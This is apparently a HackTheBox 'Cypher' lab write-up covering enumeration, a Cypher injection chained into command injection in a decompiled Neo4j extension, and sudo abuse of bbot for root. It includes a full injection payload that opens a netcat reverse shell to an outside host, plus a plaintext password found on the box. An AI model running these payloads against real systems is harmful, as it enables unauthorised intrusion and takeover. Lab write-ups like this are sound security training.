# HackTheBox - Cypher
07/25/2025

## Summary
- **Difficulty:** Medium
- **Category:** Web
- **Operating System:** Linux
- **Objective:** Gain user and root flags.
- **Skills Used:** 
  - Cypher Injection, 
---

## Enumeration

#### nmap
`nmap` found two open ports: `22 (SSH) & 80 (HTTP)`

```
root@parrot ~/main/ctfs/htb/cypher$ nmap -p- --min-rate 10000 10.10.11.57 -o nmap/full_scan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-25 02:43 EDT
Nmap scan report for 10.10.11.57
Host is up (0.043s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 9.64 seconds
root@parrot ~/main/ctfs/htb/cypher$ nmap -p22,80 -sC -sV -o nmap/cypher 10.10.11.57
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-25 02:43 EDT
Nmap scan report for 10.10.11.57
Host is up (0.040s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.91 seconds

```

We also find that the web server is redirecting to `cypher.htb` which I will add to my `/etc/hosts` file. I checked for subdomains using `fuff` but found nothing.
#### Cypher.htb

When opening `cypher.htb` we are greeted with an attack surface management (ASM) solution. An ASM identifies potential entry points (the attack surface) of applications. 

![[Pasted image 20250725025743.png]]

When trying a free demo we are prompted to login.
![[Pasted image 20250725030153.png]]
Since we are met with an empty login page with no credentials my mind instantly thought to test some form of injection such as `SQL Injection`. To test for this I first saved the login request in `burpsuite` and inputted a single quote into the `username` parameter to view the response:
![[Pasted image 20250725031603.png]]
We find that this causes the application to produce a `400 Bad Request` response code, since it errored this is a strong indication of injection. After viewing the response text we find that the application uses `Cypher` which is a query language for `Neo4j`.

We also find the application is running this payload: 
```
MATCH (u:USER)-[:SECRET]->(h:SHA1) WHERE u.name = '' RETURN h.value as hash`
```
I couldn't exploit this using cypher injection, so I pivoted my focus to something else.

I ran a `feroxbuster` scan on `cypher.htb` as found an interesting directory named `testing`:
```
/home/smog/.local/bin/feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -u http://cypher.htb -o cypher.htb.scan
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cypher.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💾  Output File           │ cypher.htb.scan
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      162l      360w     4562c http://cypher.htb/index
200      GET      179l      477w     4986c http://cypher.htb/about
200      GET       63l      139w     1548c http://cypher.htb/utils.js
200      GET        3l      113w     8123c http://cypher.htb/bootstrap-notify.min.js
200      GET      126l      274w     3671c http://cypher.htb/login
307      GET        0l        0w        0c http://cypher.htb/demo => http://cypher.htb/login
307      GET        0l        0w        0c http://cypher.htb/api/ => http://cypher.htb/api/api
405      GET        1l        3w       31c http://cypher.htb/api/auth
307      GET        0l        0w        0c http://cypher.htb/api => http://cypher.htb/api/docs
200      GET        7l     1223w    80496c http://cypher.htb/bootstrap.bundle.min.js
200      GET      162l      360w     4562c http://cypher.htb/
301      GET        7l       12w      178c http://cypher.htb/testing => http://cypher.htb/testing/
```

When visiting this directory we are met with a web index that has a single file named `custom-apoc-extension-1.0-SNAPSHOT.jar`. I proceed to extract the `jar` file:
```
unzip custom-apoc-extension-1.0-SNAPSHOT.jar -d extracted 
```

This `jar` seems to be related to an `APOC` (Awesome Procedures on Cypher) extension which adds custom procedures and functions to `Cypher`.

When unzipping the jar I am met with two directories `com` and `META-INF`. The `com` directory seems to hold the classes of the jar file, while the `META-INF` directory holds meta-data:

```
├── custom-apoc-extension-1.0-SNAPSHOT.jar
└── extracted
    ├── com
    │   └── cypher
    │       └── neo4j
    │           └── apoc
    │               ├── CustomFunctions$StringOutput.class
    │               ├── CustomFunctions.class
    │               ├── HelloWorldProcedure$HelloWorldOutput.class
    │               └── HelloWorldProcedure.class
    └── META-INF
        ├── MANIFEST.MF
        └── maven
            └── com.cypher.neo4j
                └── custom-apoc-extension
                    ├── pom.properties
                    └── pom.xml
```

My next thought was to reverse engineer the `jar` file. Java `.class` files contain Java bytecode, which is a compiled version of Java source code, this can then be used to decompile and rebuild a close approximation of the original source code. 

We can do this using multiple different tools, but I opted to use `CFR` which is a java decompiler. I first downloaded the decompiler on the official site. Then proceeded to decompile the `.class` files:
```
java -jar cfr-0.152.jar extracted/com/cypher/neo4j/apoc/*.class --outputdir decompiled/
```

We are met with these two files: `CustomFunctions.java` & `HelloWorldProcedure.java`:
```
└── com
    └── cypher
        └── neo4j
            └── apoc
                ├── CustomFunctions.java
                └── HelloWorldProcedure.java

```
The `HelloWorldProcedure.java` file contains nothing interesting and is just a regular Hello World script.
## Exploitation
`CustomFunctions.java`:
```java
/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.neo4j.procedure.Description
 *  org.neo4j.procedure.Mode
 *  org.neo4j.procedure.Name
 *  org.neo4j.procedure.Procedure
 */
package com.cypher.neo4j.apoc;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;
import java.util.stream.Stream;
import org.neo4j.procedure.Description;
import org.neo4j.procedure.Mode;
import org.neo4j.procedure.Name;
import org.neo4j.procedure.Procedure;

public class CustomFunctions {
    @Procedure(name="custom.getUrlStatusCode", mode=Mode.READ)
    @Description(value="Returns the HTTP status code for the given URL as a string")
    public Stream<StringOutput> getUrlStatusCode(@Name(value="url") String url) throws Exception {
        String line;
        if (!((String)url).toLowerCase().startsWith("http://") && !((String)url).toLowerCase().startsWith("https://")) {
            url = "https://" + (String)url;
        }
        Object[] command = new String[]{"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + (String)url};
        System.out.println("Command: " + Arrays.toString(command));
        Process process = Runtime.getRuntime().exec((String[])command);
        BufferedReader inputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
        StringBuilder errorOutput = new StringBuilder();
        while ((line = errorReader.readLine()) != null) {
            errorOutput.append(line).append("\n");
        }
        String statusCode = inputReader.readLine();
        System.out.println("Status code: " + statusCode);
        boolean exited = process.waitFor(10L, TimeUnit.SECONDS);
        if (!exited) {
            process.destroyForcibly();
            statusCode = "0";
            System.err.println("Process timed out after 10 seconds");
        } else {
            int exitCode = process.exitValue();
            if (exitCode != 0) {
                statusCode = "0";
                System.err.println("Process exited with code " + exitCode);
            }
        }
        if (errorOutput.length() > 0) {
            System.err.println("Error output:\n" + errorOutput.toString());
        }
        return Stream.of(new StringOutput(statusCode));
    }

    public static class StringOutput {
        public String statusCode;

        public StringOutput(String statusCode) {
            this.statusCode = statusCode;
        }
    }
}
```

When reading this source code I noticed it contains a `RCE` vulnerability:
```java
Object[] command = new String[]{"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + (String)url};
Process process = Runtime.getRuntime().exec((String[])command);
```

In these lines, a shell command containing user-supplied input is constructed, and is then executed. Since the user-supplied input is directly passed into the shell command, without proper sanitization you can inject malicious shell commands leading to remote code execution. 

For example, we can call this in the Cypher Injection vulnerability we found like so: `CALL custom.getUrlStatusCode("127.0.0.1; whoami") YIELD statusCode RETURN statusCode`

We can test this like so:
payload used: `administrator' RETURN h.value as hash UNION CALL custom.getUrlStatusCode('http://10.10.16.3/;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.61 9001 >/tmp/f') YIELD statusCode AS hash RETURN hash;//","password":"'"`
We successfully got a shell on the box!
## Privilege Escalation to `graphasm`

When searching around the system we find a user `graphasm`:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
graphasm:x:1000:1000:graphasm:/home/graphasm:/bin/bash
neo4j:x:110:111:neo4j,,,:/var/lib/neo4j:/bin/bash
_laurel:x:999:987::/var/log/laurel:/bin/false
```

When searching in the home directory of this user we find a `yml` configuration file that contains the password of `graphasm`:
```
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
```

## Privilege Escalation to `root`

As `graphasm` we are allowed to execute `/usr/local/bin/bbot` using `sudo` with no restrictions:
```
graphasm@cypher:~$ sudo -l
sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

When searching online for an exploit we find a `Local Privilege Escalation via Malicious Module Execution` exploit on `bbot` version 2.1.0: https://seclists.org/fulldisclosure/2025/Apr/19

`bbot` is an OSINT tool.
This exploit works since `bbot` allows users to read and write custom Python modules during scanning. When `bbot` is configured to run with `sudo` privileges, any malicious code placed inside a custom module is executed with root privileges. This allows a local attacker to escalate their privileges by injecting arbitrary code into a module and triggering it during a scan, effectively gaining a root shell.

```
graphasm@cypher:~$ /usr/local/bin/bbot --version
/usr/local/bin/bbot --version
  ______  _____   ____ _______
 |  ___ \|  __ \ / __ \__   __|
 | |___) | |__) | |  | | | |
 |  ___ <|  __ <| |  | | | |
 | |___) | |__) | |__| | | |
 |______/|_____/ \____/  |_|
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc

www.blacklanternsecurity.com/bbot
alnerab
v2.1.0.4939rc
```

We are on the matching version of `bbot` for this exploit.

We can follow the exploit and gain the root user on the box!
![[Pasted image 20250725053136.png]]
